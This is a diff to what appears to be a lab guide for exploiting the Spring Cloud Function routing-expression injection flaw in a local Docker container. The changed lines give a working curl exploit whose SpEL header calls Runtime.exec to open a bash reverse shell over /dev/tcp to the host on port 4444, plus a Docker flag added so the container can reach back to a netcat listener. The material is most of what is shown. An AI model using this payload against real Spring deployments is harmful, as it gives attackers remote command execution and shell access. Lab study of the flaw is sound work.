@@ -22,8 +22,8 @@ Spring Cloud Function allows routing HTTP requests via the `spring.cloud.functio
 # Build the Docker image
 docker build -t vuln-spring .
 
-# Run the container
-docker run -p 8080:8080 --name vuln-app vuln-spring
+# Run the container (we add the host.docker.internal so it can communicate back to the host for a reverse shell)
+docker run -p 8080:8080 --add-host=host.docker.internal:host-gateway --name vuln-app vuln-spring
 
 # Verify it's running
 curl http://localhost:8080/
@@ -67,7 +67,7 @@ nc -lvnp 4444
 ```bash
 # Simple bash reverse shell
 curl -X POST http://127.0.0.1:8080/functionRouter \
-  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"})' \
+  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","bash -i >& /dev/tcp/host.docker.internal/4444 0>&1"})' \
   --data 'Never gonna run around and desert you'
 ```
 
